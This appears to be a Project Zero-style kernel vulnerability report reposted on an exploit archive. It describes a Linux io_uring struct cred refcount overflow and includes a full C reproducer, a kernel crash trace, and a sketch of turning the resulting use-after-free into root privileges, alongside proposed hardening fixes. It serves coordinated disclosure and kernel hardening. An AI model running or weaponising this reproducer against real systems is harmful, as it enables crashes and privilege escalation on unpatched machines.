@@ -1,0 +1,237 @@
+id: 39253
+date: 01/21/2024
+title: Linux 5.6 io_uring Cred Refcount Overflow Exploit
+author: Jann Horn
+cves: 
+
+Linux >=5.6: cred refcount overflow at ~39 GiB memory usage via io_uring
+
+(see also my related prior bug reports about overflowing refcounts with lots
+of RAM usage:
+https://crbug.com/project-zero/809: BPF program refcount, with ~32GiB RAM
+https://crbug.com/project-zero/1752: page->refcount via FUSE with ~140GiB RAM)
+
+
+Since commit 071698e13ac6 (\"io_uring: allow registering credentials\"), landed
+in 5.6, it has been possible to grab references to `struct cred` very
+efficiently - by repeatedly calling the syscall
+`io_uring_register(fd, IORING_REGISTER_PERSONALITY, NULL, 0)`, it is possible
+to register up to 0xffff refcounted pointers to `struct cred` in an xarray
+(or in older kernel versions, in an IDR). These pointers can all be pointing
+to the same `struct cred`.
+By using a bunch of io_uring instances, that makes it possible to create a
+lot of refcounted references to `struct cred` at a very efficient and low
+amortized memory cost of less than 10 bytes per reference.
+
+`struct cred` is refcounted using the member `atomic_t usage`, which is a
+plain signed 32-bit atomic counter with no overflow checking.
+I believe there is some history here where Elena Reshetova and Kees Cook have
+been trying to turn it into a `refcount_t`, which would also fix this kind of
+issue by marking the refcount as \"saturated\" when it reaches 2^31 and then
+never freeing the object. Most recently there was this thread, where Kees
+tried to get that change in; there was some discussion, but I don't think
+anything has landed so far:
+<https://lore.kernel.org/all/20230818041740.gonna.513-kees@kernel.org/>
+
+So by using ~39 GiB of physical memory, it is possible to store 2^32
+references to `struct cred` and overflow the reference counter. That's not
+exactly a small amount of RAM, but I guess a lot of servers probably have that
+much RAM? At least cloud providers like AWS sell machines with much more RAM
+than that.
+
+I am including as recipients both akpm (who is the maintainer for
+kernel/cred.c and was involved in the linked discussion) and the io_uring
+maintainers (though io_uring, in my opinion, isn't really where the core issue
+here lies, but it happened to make it possible to hit this overflow using a
+fairly small amount of physical memory).
+
+
+Reproducer (compile with -pthread; requires ~39GiB of physical RAM, I tested it
+in a VM so that the host machine could swap a bit):
+============
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <unistd.h>
+#include <err.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <signal.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <sys/prctl.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/eventfd.h>
+#include <linux/io_uring.h>
+
+#define SYSCHK(x) ({          \\
+  typeof(x) __res = (x);      \\
+  if (__res == (typeof(x))-1) \\
+    err(1, \"SYSCHK(\" #x \")\"); \\
+  __res;                      \\
+})
+
+// power of 2
+#define PARALLELISM 4
+
+static int efd;
+
+static void *thread_fn(void *dummy) {
+  for (long refcount = 0; refcount < (1UL<<32)/PARALLELISM;) {
+    struct io_uring_params params = {
+      .flags = IORING_SETUP_NO_SQARRAY
+    };
+    int uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/40, &params));
+    printf(\"uring_fd = 0x%x\
+\", (unsigned int)uring_fd);
+    for (int i=0; i<0xffff; i++, refcount++)
+      SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, NULL, 0));
+  }
+  printf(\"one thread ready\
+\");
+  eventfd_write(efd, 1);
+  while (1) pause();
+}
+
+int main(void) {
+  setbuf(stdout, NULL);
+  sync();
+
+  struct rlimit rlim;
+  SYSCHK(getrlimit(RLIMIT_NOFILE, &rlim));
+  if (rlim.rlim_max < 65550)
+    printf(\"WARNING: RLIMIT_NOFILE maximum is probably too low\
+\");
+  rlim.rlim_cur = rlim.rlim_max;
+  SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));
+
+  efd = SYSCHK(eventfd(0, 0));
+
+  pthread_t threads[PARALLELISM];
+  for (int i = 0; i < PARALLELISM; i++) {
+    if (pthread_create(threads+i, NULL, thread_fn, NULL))
+      errx(1, \"pthread_create\");
+  }
+
+  for (int i=0; i<4;) {
+    eventfd_t val;
+    SYSCHK(eventfd_read(efd, &val));
+    i += val;
+  }
+  printf(\"refs should have wrapped. press ctrl+c for uaf on cleanup.\
+\");
+  while (1)
+    pause();
+}
+============
+
+The reproducer takes a while to run; when it's done and the cred refcount has
+been wrapped, you can press ctrl+c to make the process exit, which will
+repeatedly decrement the cred refcount until the cred refcount reaches zero
+(when there are actually 2^32 references remaining).
+At that point, it'll hit the `BUG_ON(cred == current->cred)` check in
+`__put_cred()`, since the reproducer doesn't go out of its way to avoid this
+check:
+
+============
+kernel BUG at kernel/cred.c:150!
+invalid opcode: 0000 [#1] PREEMPT SMP
+CPU: 2 PID: 580 Comm: uring-credref Not tainted 6.7.0-rc3 #362
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
+RIP: 0010:__put_cred+0x55/0x60
+Code: 87 a0 00 00 00 85 c0 74 0c 48 81 c7 a0 00 00 00 e9 b0 fe ff ff 48 81 c7 a0 00 00 00 48 c7 c6 40 39 0d b0 e9 9d 53 07 00 0f 0b <0f> 0b 0f 0b 0f 1f 80 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
+RSP: 0018:ffffb2e382b5bcf0 EFLAGS: 00010246
+RAX: ffff8c4e21c6c080 RBX: ffff8c52fce02000 RCX: ffffb2e382b5bc94
+RDX: 0000000000000001 RSI: ffff8c52fce025c0 RDI: ffff8c4e1f2c2480
+RBP: ffff8c52fce025a8 R08: ffffb2e382b5bc98 R09: 0000000000000007
+R10: 0000000000000001 R11: 0000000000000001 R12: ffff8c52fce02040
+R13: ffff8c4e072fc520 R14: ffff8c576139c9c0 R15: ffff8c4e21c6c938
+FS:  0000000000000000(0000) GS:ffff8c598dd00000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 000055a8bdfd1d70 CR3: 0000000411e47001 CR4: 0000000000770ef0
+PKRU: 55555554
+Call Trace:
+ <TASK>
+ [...]
+ io_ring_ctx_wait_and_kill+0xa8/0x180
+ io_uring_release+0x20/0x30
+ __fput+0x92/0x2c0
+ task_work_run+0x5a/0x90
+ do_exit+0x36c/0xbc0
+ do_group_exit+0x37/0xa0
+ get_signal+0xbcf/0xbd0
+ arch_do_signal_or_restart+0x3e/0x270
+ exit_to_user_mode_prepare+0xba/0x110
+ syscall_exit_to_user_mode+0x21/0x50
+ do_syscall_64+0x52/0xf0
+ entry_SYSCALL_64_after_hwframe+0x6e/0x76
+RIP: 0033:0x7ff41d547d92
+Code: Unable to access opcode bytes at 0x7ff41d547d68.
+RSP: 002b:00007ff41d370e30 EFLAGS: 00000293 ORIG_RAX: 0000000000000022
+RAX: fffffffffffffdfe RBX: 000000004000bfff RCX: 00007ff41d547d92
+RDX: 0000000000000008 RSI: 00007ff41d370e38 RDI: 0000000000000000
+RBP: 000000000000ffc1 R08: 0000000000000000 R09: 0000008000000040
+R10: 0000000000000000 R11: 0000000000000293 R12: 000000004000bfff
+R13: 00007ff41d370e50 R14: 00007ff41d370e50 R15: 0000000000000000
+ </TASK>
+Modules linked in:
+---[ end trace 0000000000000000 ]---
+RIP: 0010:__put_cred+0x55/0x60
+Code: 87 a0 00 00 00 85 c0 74 0c 48 81 c7 a0 00 00 00 e9 b0 fe ff ff 48 81 c7 a0 00 00 00 48 c7 c6 40 39 0d b0 e9 9d 53 07 00 0f 0b <0f> 0b 0f 0b 0f 1f 80 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
+RSP: 0018:ffffb2e382b5bcf0 EFLAGS: 00010246
+RAX: ffff8c4e21c6c080 RBX: ffff8c52fce02000 RCX: ffffb2e382b5bc94
+RDX: 0000000000000001 RSI: ffff8c52fce025c0 RDI: ffff8c4e1f2c2480
+RBP: ffff8c52fce025a8 R08: ffffb2e382b5bc98 R09: 0000000000000007
+R10: 0000000000000001 R11: 0000000000000001 R12: ffff8c52fce02040
+R13: ffff8c4e072fc520 R14: ffff8c576139c9c0 R15: ffff8c4e21c6c938
+FS:  0000000000000000(0000) GS:ffff8c598dd00000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 000055a8bdfd1d70 CR3: 0000000411e47001 CR4: 0000000000770ef0
+PKRU: 55555554
+Fixing recursive fault but reboot is needed!
+============
+
+A use-after-free of `struct cred` should be exploitable; one method would be
+to try to get the freed object allocated again as the `struct cred` of a
+root-privileged process, another method would be to try to reallocate the
+object with a buffer containing attacker-controlled data somehow (and then
+fake a full capability set in init_user_ns with UIDs set to zero).
+
+
+While one tempting easy fix here would be to close off avenues for getting
+lots of references with little RAM (like somehow making io_uring reuse IDs
+with a local usage counter when userspace tries to insert the same
+`struct cred` into the xarray multiple times), I think that this example shows
+how fragile that method is. It requires knowing about all the various
+reference paths that can hold references to `struct cred`, and what kinds of
+multipliers or global limits apply at every point in this reference graph.
+
+I think the kernel should be using some flavor of saturating refcounts as the
+default choice, at least on machines that have enough RAM to store 2^32
+pointers.
+If there are specific cases where the overhead is undesirable, I think we
+should only omit such a check if we can document exactly how many references
+can exist at most, with enough warning comments scattered around to ensure
+that the assumptions can't accidentally be broken inadvertently later on.
+
+(Or the kernel could limit SLUB to a maximum of 32 GiB of memory except for
+specially marked slabs that store objects guaranteed to not hold multiple
+references to the same object, but I think people would probably hate that
+idea.)
+
+(But note that refcount hardening also has value for protecting against bugs
+where some repeatedly executed codepath forgets to decrement the refcount,
+letting it drift up until it wraps around; and that kind of bug is also
+exploitable without using ginormous amounts of RAM.)
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2024-02-26.
+
+#  0day.today [2024-01-27]  #
